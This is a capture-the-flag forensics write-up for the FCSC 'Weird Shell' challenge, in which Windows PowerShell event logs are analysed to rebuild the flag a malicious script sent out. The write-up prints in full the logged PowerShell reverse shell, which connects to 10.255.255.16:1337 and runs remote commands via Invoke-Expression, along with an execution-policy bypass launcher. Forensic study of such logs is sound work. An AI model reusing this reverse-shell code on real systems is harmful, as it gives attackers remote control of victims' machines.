# Weird Shell

# Original challenge 🇫🇷
Un autre utilisateur a un comportement similaire à La gazette de Windows (catégorie intro). Mais cette fois, pour retrouver ce qui a été envoyé à l'attaquant il faudra peut-être plus de logs.

# Translated challenge 🇺🇸
Another user has similar behavior to Windows Gazette (intro category). But this time, to find what was sent to the attacker, you may need more logs.

# Solution
Once again, we are dealing with an .evtx file, we can use the Windows Event Viewer to explore it.

Search for Windows Event Viewer and open it.

Open the Microsoft-Windows-PowerShell4Operational.evtx  and Security.evtx files.

On the Microsoft Windows PowerShell4Operational file, we can notice that there are two warning events with the following Script Block :

```
Création du texte Scriptblock (1 sur 1) : 
if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\jmichel\Downloads\payload.ps1'

ID Scriptblock : dcb325dd-1c30-46bd-8363-81083ac85323
Chemin d'accès : 
```

and 

```
Création du texte Scriptblock (1 sur 1) : 
do {
    Start-Sleep -Seconds 1
     try{
        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}
WriteToStream "FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(((Get-Process -Id $PID).Id.ToString()+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name).ToString()))))).Replace('-', '').ToLower())}`n"
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
    WriteToStream ($Output)
}
$StreamWriter.Close()


ID Scriptblock : 2354b750-2422-42a3-b8c2-4fd7fd36dfe7
Chemin d'accès : D:\PAYLOAD.PS1
```

The payload file has been given the authorization to be executed

The payload is writing an encrypted stream

To reconstruct what was sent, we need the $PID and the System.Security.Principal.WindowsIdentity

These information are available on the security logs : 

We can read it from the event at : 16:26:50 : 
```
SubjectUserName : cmaltese 
SubjectDomainName : FCSC 
ProcessId : 0xecc 
```

We don't need to have the server at the IP address available to reconstruct what was really sent.

We can skip the connexion part and create on powershell a script block with only the interesting part of the code as the following :


```
$ScriptBlock = {


$StreamWriter = New-Object IO.StreamWriter([System.Console]::OpenStandardOutput())
function WriteToStream ($String) {
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}
$processID = "3788"  # Replace with the desired process ID, 3788 is 0xecc in hex
$WindowsIdentity = "FCSC\cmaltese"
WriteToStream "FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(($processID + $WindowsIdentity).ToString()))))).Replace('-', '').ToLower())}`n"


while($true) {
    $Command = Read-Host "PS > "
    if($Command -eq "exit") { break }

    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }

    WriteToStream ($Output)
}

$StreamWriter.Close()

}
```

# Result
By running the edited Block Script we have the correct flag :

FCSC{21311ed8321926a27f6a6c407fdbe7dc308535caad861c004b382402b556bbfa}